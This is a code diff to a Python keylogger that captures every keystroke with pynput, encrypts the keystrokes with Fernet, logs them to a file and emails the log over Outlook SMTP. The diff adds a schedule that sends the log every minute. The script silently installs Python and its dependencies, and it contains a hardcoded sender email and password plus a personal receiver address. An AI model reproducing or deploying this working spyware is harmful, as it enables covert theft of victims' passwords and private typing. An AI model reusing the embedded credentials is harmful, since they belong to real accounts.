@@ -6,20 +6,20 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
 from cryptography.fernet import Fernet
+import schedule
+import time
 
 # Email details
 sender_email = "test34124logger@outlook.com"
-receiver_email = "hnyquist44@gmail.com"
+receiver_email = ""
 subject = "Keylogger Data"
 smtp_server = "smtp.office365.com"
 smtp_port = 587
 password = "Haydenandcarson12"
 
 def install_python():
-    # Check if Python is installed already
     if not os.path.exists("C:\\Python311\\python.exe"):
         python_installer = "python-3.11.9-amd64.exe"
-        # Run Python installer silently
         subprocess.run([python_installer, '/quiet', '/norestart'])
 
 def install_package(package):
@@ -35,6 +35,11 @@ def ensure_libraries_installed():
         import cryptography
     except ImportError:
         install_package('cryptography')
+    
+    try:
+        import schedule
+    except ImportError:
+        install_package('schedule')
 
 def get_encryption_key():
     try:
@@ -51,20 +56,20 @@ def keyPressed(key):
     cipher_suite = Fernet(encryption_key)
 
     try:
-        with open("keyfile.txt", 'ab') as logKey:  # Open in binary mode to write encrypted bytes
+        with open("keyfile.txt", 'ab') as logKey:
             if hasattr(key, 'char') and key.char is not None:
                 encrypted_char = cipher_suite.encrypt(key.char.encode())
                 logKey.write(encrypted_char)
-                logKey.write(b'\n')  # Adding a delimiter for each input
+                logKey.write(b'\n')
             else:
                 if key == keyboard.Key.space:
                     encrypted_space = cipher_suite.encrypt(b' ')
                     logKey.write(encrypted_space)
-                    logKey.write(b'\n')  # Adding a delimiter for each input
+                    logKey.write(b'\n')
                 else:
                     encrypted_special_key = cipher_suite.encrypt(f'[{key}]'.encode())
                     logKey.write(encrypted_special_key)
-                    logKey.write(b'\n')  # Adding a delimiter for each input
+                    logKey.write(b'\n')
     except Exception as e:
         print(f"Error logging key: {str(e)}")  
 
@@ -82,12 +87,10 @@ def send_email():
         message["To"] = receiver_email
         message["Subject"] = subject
 
-        # Add the file content as a plain text attachment
         part = MIMEText(file_content.decode(), "plain")
         message.attach(part)
 
         server = smtplib.SMTP(smtp_server, smtp_port)
-        #server.set_debuglevel(1)  # <--- Comment out to view debug info
         server.starttls()
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
@@ -101,10 +104,13 @@ if __name__ == "__main__":
     install_python()
     ensure_libraries_installed()
 
-    # Ensure the keyfile.txt is empty at the start
-    open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file
+    open("keyfile.txt", 'wb').close()
+
+    schedule.every(1).minutes.do(send_email)
 
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
-    listener.join()
-    input()
+
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
